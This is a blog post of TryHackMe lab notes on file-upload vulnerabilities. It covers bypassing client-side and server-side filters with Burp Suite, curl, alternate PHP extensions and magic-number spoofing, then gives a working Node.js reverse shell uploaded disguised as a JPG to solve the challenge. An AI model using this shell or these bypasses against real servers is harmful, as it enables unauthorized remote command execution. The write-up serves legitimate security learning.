@@ -1,0 +1,86 @@
+---
+title: 'TryHackMe: Complete Beginner'
+date: 2021-10-09 05:00:00.000000000 Z
+layout: post-external
+original_link: https://cardboard-iguana.com/log/2021-10-09-tryhackme-complete-beginner.html
+author: 100007
+---
+
+<h1 id="tryhackme-complete-beginner">TryHackMe: Complete Beginner</h1>
+<p><strong>author:</strong> Nathan Acks<br />
+<strong>date:</strong> 2021-10-09</p>
+<h2 id="upload-vulnerabilities">Upload Vulnerabilities</h2>
+<h3 id="bypassing-client-side-filtering">Bypassing Client-Side Filtering</h3>
+<p>How to bypass:</p>
+<ul>
+<li>Just turn off JavaScript.</li>
+<li>Use Burp Suite to modify the incoming page to remove the filter (often needs to be done before the page is loaded).</li>
+<li>Use Burp Suite to modify the file upload <em>after</em> it has passed the filters.</li>
+<li>Use curl to send the file directly to the upload endpoint (make a good upload first to see what that looks like).</li>
+</ul>
+<p>To modify the page in Burp Suite, first get the server response by right-clicking on the outgoing intercept and choosing Do intercept &gt; Response to this request. When we forward the request, the response will then be intercepted, and we can modify it as desired.</p>
+<p>NOTE: Burp Suite does not intercept JavaScript files; to do this, we’ll need to modify the proxy’s default file extension filter under “Options”.</p>
+<p>Modifying the file upload itself is much easier, as this can be done using Burp Suite’s normal interception flow. Note that Burp Suite <em>cannot</em> attach new files, so we’ll need to modify the upload file (extension, etc.) to get past the filters, then undo our changes in the outgoing request.</p>
+<p>Sending a file via curl is basically the same procedure as modify the file upload request, except that we let a good file go through so we can see the upload endpoint and then communicate with that directly.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-X</span> POST <span class="nt">-F</span> <span class="s2">"submit=</span><span class="nv">$SUBMIT_VALUE</span><span class="s2">"</span> <span class="se">\</span>
+<span class="nt">-F</span> <span class="s2">"</span><span class="k">$&#x007b;</span><span class="nv">FILE_INPUT</span><span class="p"> NAME</span><span class="k">&#x007d;</span><span class="s2">=@</span><span class="nv">$PATH_TO_FILE</span><span class="s2">"</span> <span class="nv">$URL</span>
+</code></pre></div></div>
+<h3 id="bypassing-server-side-filtering-file-extensions">Bypassing Server-Side Filtering: File Extensions</h3>
+<p>Basically, bypassing server-side filters is going to involve a lot of trial and error until we figure out what the filter is (and how to work around it).</p>
+<p>The trick, of course, is not only that you need to upload your file, but that you need to use an extension that the server will execute!</p>
+<p>Note that sometimes developers just check to see if a valid extension exists within a file, so things like reverse-shell.jpg.php will work. Happy days if this is you.</p>
+<p>Common file extensions for PHP:</p>
+<ul>
+<li>.php</li>
+<li>.phar</li>
+<li>.phtml</li>
+<li>.pht</li>
+<li>.phps (though I’ve always seen this as <em>source</em> code)</li>
+<li>.php# (where <code class="language-plaintext highlighter-rouge">#</code> is the running PHP major version)</li>
+</ul>
+<p>References:</p>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/PHP">PHP (Wikipedia)</a></li>
+</ul>
+<h3 id="bypassing-server-side-filtering-magic-numbers">Bypassing Server-Side Filtering: Magic Numbers</h3>
+<p>To recap: This is (generally) the first 4 bytes of a file. Apparently, text files don’t have magic number, so one trick you can do is just insert four ASCII characters in the front of your file and then use a hex editor to change them to an appropriate magic number.</p>
+<p><a href="https://en.wikipedia.org/wiki/List_of_file_signatures">Wikipedia’s list of magic numbers.</a></p>
+<p>The <code class="language-plaintext highlighter-rouge">hexeditor</code> app is a quick-and-easy hex editor, and <code class="language-plaintext highlighter-rouge">file</code> can give you a sense of whether you’ve effectively spoofed a file’s magic number.</p>
+<p>Note that this can be a lot trickier if you’re not dealing with PHP, since many languages don’t have PHP’s concept of interpreted vs. non-interpreted bits.</p>
+<h3 id="example-methodology">Example Methodology</h3>
+<p>The <code class="language-plaintext highlighter-rouge">Server</code> and <code class="language-plaintext highlighter-rouge">X-Powered-By</code> HTTP headers, if present, can be handy for figuring out what language we’re dealing with.</p>
+<p>Since many servers turn off directory indexing and randomize file names, its helpful if we can figure out some place that displays or links to the file we just uploaded. If there’s no option here, gobuster’s -x switch allows a search for specific file extensions (but then the search is <em>within</em> a particular directory).</p>
+<p>There’s probably server-side filtering, so bypass everything client-side and then look for an error message. Using curl to hit an endpoint directly is probably not as useful as Burp Suite here… Tricks:</p>
+<ul>
+<li>Use completely valid and invalid extensions to check for the presence of white/blacklists.</li>
+<li>Try changing the magic number of a known good file to see if magic number filtering is in place.</li>
+</ul>
+<h3 id="challenge">Challenge</h3>
+<p>Potentially interesting directories in /content, /assets, /modules, /admin.</p>
+<p>The provided wordlist is combinations of three capital letters. The backgrounds files also follow this pattern (ABH.jpg, LKQ.jpg, SAD.jpg, UAD.jpg). All backgrounds are located in the /content directory (and the form says that uploaded files will be added to the slides), so I’ll bet that this is where uploaded files go. I did one good upload (and then a scan with gobuster) to verify this.</p>
+<p>The server’s response when loading a page indicates that it is running Express. So we’ll need a Node.js compatible reverse shell. I used the first option from the Reverse Shell Cheat Sheet (note that the port and IP address in line 6 need to be customized).</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kd">function</span><span class="p">()&#x007b;</span>
+<span class="kd">var</span> <span class="nx">net</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">net</span><span class="dl">"</span><span class="p">),</span>
+<span class="nx">cp</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">child_process</span><span class="dl">"</span><span class="p">),</span>
+<span class="nx">sh</span> <span class="o">=</span> <span class="nx">cp</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="dl">"</span><span class="s2">/bin/sh</span><span class="dl">"</span><span class="p">,</span> <span class="p">[]);</span>
+<span class="kd">var</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">net</span><span class="p">.</span><span class="nx">Socket</span><span class="p">();</span>
+<span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="mi">1234</span><span class="p">,</span> <span class="dl">"</span><span class="s2">127.0.0.1</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">()&#x007b;</span>
+<span class="nx">client</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdin</span><span class="p">);</span>
+<span class="nx">sh</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
+<span class="nx">sh</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
+<span class="p">&#x007d;);</span>
+<span class="k">return</span> <span class="sr">/a/</span><span class="p">;</span> <span class="c1">// Prevents Node.js from crashing</span>
+<span class="p">&#x007d;)();</span>
+</code></pre></div></div>
+<p>(NOTE: I actually tried the more compact shell listed after this on the Reverse Shell Cheat Sheet, but it didn’t work.)</p>
+<p>The /assets/js/upload.js script handles uploads. It requires files less than 400k in size with the first three bytes matching the JPG magic number (these are the only three bytes that are consistent between all JPG magic numbers) and an extension of .jpg or .jpeg.</p>
+<p>Initially I tried to add the relevant magic bytes to the front of my JS file with the idea that I would edit them out of the request once they made it through the client-side filtering. However, when I viewed the request I discovered that content was base64 encoded, so I just used <code class="language-plaintext highlighter-rouge">base64 -w 0</code> to encode the shell <em>without</em> the leading bytes and replaced the uploaded file entirely.</p>
+<p>(NOTE: Initially I changed the MIME type to text/plain, but the server rejected this. Leaving it as image/jpeg worked though, no matter what the file extension. Note that the MIME type on the base64-encoded line didn’t seem to matter.)</p>
+<p>Re-scanning the /content directory with gobuster for .js files revealed nothing, but rescanning for .jpg revealed that the server was renaming all files with the .jpg extension. Fortunately, the uploaded shell was so much smaller than either the pre-existing images or my uploaded test that it was easy to pick out</p>
+<p>THIS IS WHERE I GOT STUCK. I finally wound up looking at the challenge hints, most of which it turned out I’d already figured out. But Hint 9 suggested looking at the /admin page, which I hadn’t bothered to try to visit. LET THAT BE A LESSON TO ME — POKE AROUND MORE!</p>
+<p>The admin page indicates that it loads modules, so this is how we’re going to get the Express app to execute the reverse shell (I’d been wondering how I was going to get it loaded into memory up until this point). Loading ../content/XKM.jpg (which is where my shell wound up) in this page resulted popped the shell, after which grabbing the flag was easy.</p>
+<ul>
+<li><a href="http://expressjs.com/">Express</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">Reverse Shell Cheat Sheet</a></li>
+<li><a href="https://muirlandoracle.co.uk/2020/06/30/file-upload-vulnerabilities-hints/">TryHackMe: File Upload Vulnerabilities — Hints</a></li>
+</ul>
